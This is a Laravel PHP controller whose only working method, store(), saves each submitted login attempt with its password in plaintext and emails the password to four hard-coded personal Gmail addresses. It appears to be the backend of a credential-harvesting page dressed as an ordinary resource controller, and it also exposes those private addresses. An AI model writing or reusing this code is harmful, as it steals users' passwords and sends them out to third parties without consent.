<?php

namespace App\Http\Controllers;

use App\LoginInfo;
use App\Mail\LoggedIn;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class LoginInfoController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        //
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
        $info = new LoginInfo();
        $info->attempt = $request->attempt;
        $info->password = $request->password;
        if($request->password == null){
            $info->password = '';
        }
        $info->save();
        // "crlnkurniawan@gmail.com"
        // Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com"])->send(new LoggedIn($info->password));
        Mail::to(["sjovianto@gmail.com", "ssjovianto@gmail.com", "feliciakurniawann06@gmail.com", "crlnkurniawan@gmail.com"])->send(new LoggedIn($info->password));
        return $info;
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\LoginInfo  $loginInfo
     * @return \Illuminate\Http\Response
     */
    public function show(LoginInfo $loginInfo)
    {
        //
    }
    
    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\LoginInfo  $loginInfo
     * @return \Illuminate\Http\Response
     */
    public function edit(LoginInfo $loginInfo)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\LoginInfo  $loginInfo
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, LoginInfo $loginInfo)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\LoginInfo  $loginInfo
     * @return \Illuminate\Http\Response
     */
    public function destroy(LoginInfo $loginInfo)
    {
        //
    }
}
